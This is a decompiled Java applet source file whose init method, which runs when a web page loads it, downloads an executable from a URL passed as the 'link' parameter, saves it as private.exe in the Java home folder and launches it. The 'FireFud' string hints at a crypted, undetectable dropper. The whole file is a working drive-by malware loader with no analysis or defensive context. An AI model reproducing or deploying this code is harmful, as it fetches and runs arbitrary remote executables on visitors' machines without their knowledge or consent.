import java.io.IOException;
import java.awt.Desktop;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.File;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Private extends Applet
{
    public void init() {
        BufferedInputStream private3 = null;
        try {
            final String private4 = System.getProperty("java.home");
            System.out.print(private4 + "FireFud");
            final File private5 = new File(private4 + "\\private.exe");
            private3 = new BufferedInputStream(new URL(this.getParameter("link")).openStream());
            final FileOutputStream private6 = new FileOutputStream(private5);
            final BufferedOutputStream private7 = new BufferedOutputStream(private6, 1024);
            final byte[] data = new byte[1024];
            int count = 0;
            while ((count = private3.read(data, 0, 1024)) != -1) {
                private7.write(data, 0, count);
            }
            private7.close();
            private6.close();
            private3.close();
            Desktop.getDesktop().open(private5);
        }
        catch (IOException ex) {
            System.out.print(ex);
            try {
                private3.close();
            }
            catch (IOException ex) {
                System.out.print(ex);
            }
        }
        finally {
            try {
                private3.close();
            }
            catch (IOException ex2) {
                System.out.print(ex2);
            }
        }
    }
}
